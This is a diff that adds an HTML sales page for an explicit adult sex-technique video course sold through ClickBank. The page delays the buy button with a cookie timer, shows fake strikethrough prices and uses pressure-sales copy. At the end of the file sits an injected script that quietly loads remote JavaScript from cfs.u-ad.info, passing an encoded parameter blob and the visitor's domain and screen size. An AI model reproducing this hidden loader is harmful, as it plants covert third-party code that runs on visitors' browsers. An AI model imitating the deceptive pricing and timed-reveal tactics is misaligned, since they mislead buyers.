@@ -1,0 +1,246 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<link rel="stylesheet" type="text/css" href="http://www.thebreathtakinglover.com/css/vsl-v1/css-lf.css">
+<link rel="stylesheet" type="text/css" href="http://www.thebreathtakinglover.com/css/vsl-v1/css-lf-container-whitebox.css">
+<link rel="stylesheet" type="text/css" href="http://www.thebreathtakinglover.com/css/vsl-v1/css-vsl.css">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js" type="text/javascript"></script>
+
+
+<!-- BEGIN GA code -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-51269802-3', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<!-- END GA code -->
+
+<!-- BEGIN button pop -->
+<script type = "text/javascript">
+
+function hideButtonContainer() {
+    document.getElementById("button-container").style.display = 'yes';
+}
+function popButtonContainer() {
+    document.getElementById("button-container").style.display = 'unblock';
+}
+
+/***********************************************
+* Display time of last visit script- by JavaScriptKit.com
+* This notice MUST stay intact for use
+* Visit JavaScript Kit at http://www.javascriptkit.com/ for this script and more
+************************************************
+* Note - hacked by lmh to allow display of (and setting of) different values that can be used elsewhere
+* (as in a variable time of delay for certain page elements based on prior visit history)
+* date of hack 18 Apr 2012
+* of course in production you want to comment out all the display of messages...
+* and much of the code in the previousvisit area is just coming up with a fancy display date
+***********************************************/
+var days = 14; // days until cookie expires. To clear for testing set to a negative value and reload the page. - lmh
+var lastvisit=new Object();
+// PDATA Make sure this delay is accurate
+var origdelay = 745;  // added to let you set the delay params - expressed in seconds here - lmh
+var shortdelay = 2;
+delayvalue = origdelay;  // here we initialize to the longer value, assume first visit - lmh
+var firstvisitmsg="This is your first visit to this page. Your delay is set to [delayvalue] seconds. Welcome!"; 
+lastvisit.subsequentvisitmsg="Welcome back visitor! Your last visit was on <b>[displaydate]</b><br>";
+lastvisit.subsequentvisitdelaymsg="Your delay is set to [delayvalue] seconds.";
+
+lastvisit.getCookie=function(Name){ 
+var re=new RegExp(Name+"=[^;]+", "i"); 
+if (document.cookie.match(re)) 
+return document.cookie.match(re)[0].split("=")[1];
+return''; 
+}
+
+lastvisit.setCookie=function(name, value, days){ 
+var expireDate = new Date();
+
+var expstring=expireDate.setDate(expireDate.getDate()+parseInt(days));
+document.cookie = name+"="+value+"; expires="+expireDate.toGMTString()+"; path=/";
+}
+
+lastvisit.showmessage = function() {
+var wh = new Date();
+
+// never been here before - lmh
+// PDATA change all references to "visitc" if there are other VSLs on this same domain
+if (lastvisit.getCookie("visitc") == "") { 
+lastvisit.setCookie("visitc", wh, days); 
+// comment out the next two lines (lead with '//' ) to hide debug display -- lmh
+// document.write(firstvisitmsg.replace("\[delayvalue\]", delayvalue))
+// document.write(firstvisitmsg);  // not needed at all - lmh
+}
+// yup, a returnee - lmh
+else {
+delayvalue= shortdelay;  // here we replace the delayvalue to shortdelay since he is a returnee - lmh
+var lv = lastvisit.getCookie("visitc");
+var lvp = Date.parse(lv);
+var now = new Date();
+now.setTime(lvp);
+// the rest of this is to show off a fancy date - really not needed at all - lmh
+var day = new Array("Sun", "Mon", "Tues", "Wed", "Thur", "Fri", "Sat");
+var month = new Array ("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec");
+var dd = now.getDate();
+var dy = now.getDay();
+dy = day[dy];
+var mn = now.getMonth();
+mn = month[mn];
+yy = now.getFullYear();
+var hh = now.getHours();
+var ampm = "AM";
+if (hh >= 12) {ampm = "PM"}
+if (hh >12){hh = hh - 12};
+if (hh == 0) {hh = 12}
+if (hh < 10) {hh = "0" + hh};
+var mins = now.getMinutes();
+if (mins < 10) {mins = "0"+ mins}
+var secs = now.getSeconds();
+if (secs < 10) {secs = "0" + secs}
+var dispDate = dy + ", " + mn + " " + dd + ", " + yy + " " + hh + ":" + mins + ":" + secs + " " + ampm
+// comment out the next two lines (lead with '//' ) to hide debug display -- lmh
+// document.write(lastvisit.subsequentvisitmsg.replace("\[displaydate\]", dispDate))
+// document.write(lastvisit.subsequentvisitdelaymsg.replace("\[delayvalue\]", delayvalue))
+
+}
+
+lastvisit.setCookie("visitc", wh, days);
+
+}
+// even though the message may not be shown, we still call 'showmessage()' because it also sets the correct delayvalue 
+lastvisit.showmessage();
+
+// right here is where the delayvalue is merged into the display code. Your function is called with 'delayvalue', not a constant
+setTimeout(popButtonContainer, delayvalue*1000 ); // 1000 = 1 sec
+
+</script>
+<!-- END button pop -->
+
+
+<!-- BEGIN Message fadeout code -->
+<script type="text/javascript">
+function fadeMessage() {
+welcomeElement = document.getElementById('welcome');
+if (welcomeElement) {
+	welcomeElement.style.transitionTimingFunction = "cubic-bezier(0.6, 0.04, 0.98, 0.335)";
+	welcomeElement.style.transitionDuration = "10s";	// length of fadeout
+	welcomeElement.style.opacity = "0";
+}
+}
+setTimeout(function() { fadeMessage(); },30000);		// delay before fadeout
+</script>
+<!-- END Message fadeout code -->
+
+<title>The 7 Sexually Addicting Orgasms Program</title>
+
+<style type="text/css">
+.fancybutton-custom1 {
+}
+
+.videoborder {
+	background-image:yes;
+	background-repeat:no-repeat;
+	background-position: center;
+	padding: 35px 0 0 95px;
+	height: 420px;
+}
+
+
+</style>
+</head>
+
+<body class="vsl">
+<div id="headerbg">
+<div id="headerimage"></div>
+</div>
+<div id="bodybackground"><div id="container-wrap" class="standard">
+	<div id="content-body-outer">
+	<div id="content-body-inner" class="thinbox">
+
+	<div id="welcome" class="welcome-message" style="display:yes;"><strong>WARNING:</strong> This controversial video is for 's readers only.</div>
+
+	<p style="text-align: center; font-size: 12px;">(<strong>Make sure your sound is turned on</strong>. Please wait up to 10 seconds for video to load.)</p>
+	
+	<!-- PDATA Video embed, provide iframe URL and dimensions -->
+	<div class="videoborder">
+		<iframe src="http://fast.wistia.net/embed/iframe/hj4it73sgl?autoPlay=true&fullscreenButton=false&playButton=false&playbar=false&playerColor=000000&smallPlayButton=false&version=v1&videoHeight=384&videoWidth=512" allowtransparency="true" frameborder="0" scrolling="no" class="wistia_embed" name="wistia_embed" width="512" height="384"></iframe>
+	</div>
+	
+	<!-- BEGIN pop box -->
+	<div id="button-container" class="magicbox" style="display:none">
+		<div class="headlinetext">Get The 7 Sexually Addicting <br>Orgasms Program<br><div class="inline">For Just <span class="strikeout">$124.95</span> <span class="strikeout">$99.95</span> <span class="highlight">$59.95</span> If You Act Now!</div></div>
+		<div class="prodimage"><img src="http://www.thebreathtakinglover.com/images/7sao-bundle.png" width="280"></div>
+		<div class="cartbutton">
+			<div class="container-processing">
+				<div class="fancybutton fancybutton-processing-color fancybutton-standard-size fancybutton-custom1">
+				<div class="inert-purchase"><p>&nbsp;</p></div>
+				<div class="active-purchase" style="display:none;">
+					<span class="processing-message">Processing - Please wait...</span>
+					<div style="clear:both;"></div>
+				</div>
+				</div><br><p>&nbsp;</p>
+			</div>
+			<div class="container-active">
+				<a href="http://www.breathtakinglover.com/7sao-cart/7sao-customize-base.php?&vtid=axf"><div class="fancybutton fancybutton-theme-color fancybutton-standard-size fancybutton-custom1">
+					<p>Add to cart</p>
+					<div style="clear:both;"></div>
+				</div><br><p>Add to cart</p></a>
+			</div>
+			<!-- END to cart action -->
+			<img src="http://www.thebreathtakinglover.com/images/7sao-bundle.png" width="262" height="119"><br>
+		</div>
+		<div style="clear:both;"></div>
+		<div class="info"><strong>Your order is backed by my 60-Day, No-Questions-Asked, 100% Satisfaction Guarantee.</strong><br>If you are not 100% satisfied with your purchase, simply contact <a href="mailto:support@breathtakinglover.com">support@breathtakinglover.com</a> within 60 days for a full refund.</div>
+	</div>
+	<div style="margin-bottom:32px;"></div>
+	<!-- END pop box -->
+	
+	<!-- BEGIN Page description -->
+	<div id="pdescription">
+		<div class="description">
+			<p>The video on this page shows you exactly how you can give any woman so much pleasure she becomes sexually addicted using any one of these 7 amazing orgasm techniques.</p>
+			<p>The best part is, you’re about to watch me (Alexa Aimes) and award winning porn star Lexi Love as we give you an explicit, live demonstration of these 7 powerful yet easy to use orgasm techniques.</p>
+			<p><strong>When you use just one of these amazing orgasm techniques you never have to wonder or worry if you are truly pleasuring a woman or aren’t measuring up to one of her past lovers.</strong></p>
+			<p>In fact when you know even one of these techniques I’m about to reveal - you don’t need to have big dick, last all night, or have the rock hard cock of a horny teenager, or all those other things men think they need to give a woman an unforgettable explosive, toe-curling, full body orgasm…</p>
+			<p>So if you've ever wanted have a woman look at you with total awe and devotion… with lust, hunger and excitement in her eyes… and want to please you in every way imaginable as her personal sex god… then this will be the most important video you ever watch. <strong>Remember: Watch the entire video! The end of it may shock you.</strong></p>
+		</div>
+	</div>
+	<!-- END Page description -->
+
+	</div><!-- content-body-inner -->
+	
+	<div class="footer-content"><p>
+		Copyright &copy; 2015 PSSLJV. - All Rights Reserved.<br />
+		Email Support: <a href="support@breathtakinglover.com">support@breathtakinglover.com</a>
+	<div class="spacer"></div>
+	<span class="policylink"><a target="_blank" href="http://www.breathtakinglover.com/policy/disclaimer.html">Disclaimer</a> | <a  target="_blank "href="http://www.breathtakinglover.com/policy/60dayguarantee.html">Guarantee</a> | <a  target="_blank" href="http://www.breathtakinglover.com/policy/privacypolicy.html">Privacy Policy</a></span>
+	<br>
+	<!-- BEGIN CB footer -->
+	<span class="cbFooter">ClickBank is the retailer of this product. CLICKBANK<sup>&#174;</sup> is a registered trademark of Click Sales, Inc., a Delaware corporation located at 917 S. Lusk Street, Suite 200, Boise Idaho, 83706, USA and used by permission. ClickBank's role as retailer does not constitute an endorsement, approval or review of this product or any claim, statement or opinion used in promotion of this product.</span>
+	<!-- END CB footer -->
+	</p></div>
+
+	</div><!-- content-body-outer -->
+
+<div id="scripting" style="display:none; width:0px; height:0px; overflow:hidden; border:none;">
+
+</div>
+
+
+</div></div>
+
+<div id="footerbackground">
+<div id="footer">
+</div>
+</div>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2b6F1QSsu7RoDmuyoHbg4maNpGa4Hs6uf1WVWnU%2ft8QDC3wcBpqvCO40%2bYPmkTc%2fW3oX25ugRmsuHDc4s54HKFs6g7cMY43%2b0FYi%2fbV0sddnfmjunnh7mjvgS00IMi66A0%2ftifs%2fGrIyzH3TfI%2f8F%2f2eGr%2fpRtseMq6w1r7dbtp4Pxg8v95ui9Tq1wVB94W3wyp6BJxGcZKTbgV9kRjMAqW%2fgjBrdHZLGjMisIaf3Z8P41MkhFN5uvuZ2wb%2bcukMu%2f8hscCfqIad%2bT20qCioM%2fFBbYFsLZB6ZB57YyKaT8b7wfGdnSZiRQHgGllY8g7y4jYM3DmvezVzZLl%2brQmvkvKFW9Yk%2bKYxUo7BVod5tWG%2bOLYqdBFqzgFQW%2bP7D5uTglU4NGmxT2Fy5rLtVRaKlNsVGBKOQMt%2fObu9fiQPgV6fbmtuP4Xhd65RhQ5zOmKBBvVfvSbOZg8BO2PUL5irO1CvYHT6dQqc34LkJUWoUyR1PhAO%2bCbxdj%2fH9Ji2bORLdSM8YGoCMOArUMZlwWOyXJk4qm5rGajdv2T8rPyg%2bvdRX%2fzlPNrx5pqc5RDDOAc6tRH511GKQXgmKgi15L08WkDg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
